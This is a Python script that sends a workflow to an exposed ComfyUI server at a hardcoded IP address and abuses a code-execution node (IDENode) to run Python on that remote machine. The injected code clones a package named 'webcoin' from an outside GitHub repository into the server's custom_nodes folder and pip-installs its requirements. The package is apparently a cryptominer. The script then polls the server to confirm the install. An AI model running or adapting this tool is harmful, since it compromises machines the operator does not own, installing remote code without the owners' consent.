"""Install webcoin on a machine via IDENode (with extra_pnginfo fix) or Manager API."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "111.199.97.153"
base = f"http://{ip}:8188"

install_code = """
import os, subprocess, sys, platform

lines = []
lines.append('platform=' + platform.system())

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
    else:
        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except:
    pass
if not cn:
    for g in ['/root/ComfyUI/custom_nodes', '/workspace/ComfyUI/custom_nodes',
              r'C:\\Program Files\\ComfyUI-aki-v2\\ComfyUI\\custom_nodes',
              r'C:\\Users\\u88ni\\Desktop\\comfyui\\custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

lines.append('cn=' + str(cn))
target = os.path.join(cn, 'webcoin') if cn else None

if target and os.path.isdir(target):
    lines.append('already_exists=True')
    lines.append('files=' + str(os.listdir(target)[:15]))
elif target:
    r = subprocess.run(
        ['git', 'clone', '--depth', '1', 'https://github.com/bossman79/webcoin.git', target],
        capture_output=True, text=True, timeout=120
    )
    lines.append('clone_rc=' + str(r.returncode))
    if r.stderr.strip():
        lines.append('stderr=' + r.stderr.strip()[:200])
    if os.path.isdir(target):
        lines.append('files=' + str(sorted(os.listdir(target))[:15]))
        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r2 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            lines.append('pip_rc=' + str(r2.returncode))
            if r2.stderr.strip():
                lines.append('pip_err=' + r2.stderr.strip()[:200])
else:
    lines.append('ERROR: no custom_nodes dir found')

result = chr(10).join(lines)
"""

# Build prompt with extra_pnginfo to prevent IDENode crash
workflow_stub = {
    "workflow": {
        "nodes": [
            {"id": 1, "type": "IDENode"},
            {"id": 2, "type": "PreviewTextNode"}
        ]
    }
}

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {
                "pycode": install_code,
                "language": "python",
            }
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]}
        }
    },
    "extra_data": {
        "extra_pnginfo": workflow_stub
    }
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

print("Waiting 90s for clone + pip install...")
time.sleep(90)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
    if status == "error":
        msgs = entry.get("status", {}).get("messages", [])
        for m in msgs:
            if m[0] == "execution_error":
                err = m[1]
                print(f"Error: {err.get('exception_type')}: {str(err.get('exception_message', ''))[:300]}")
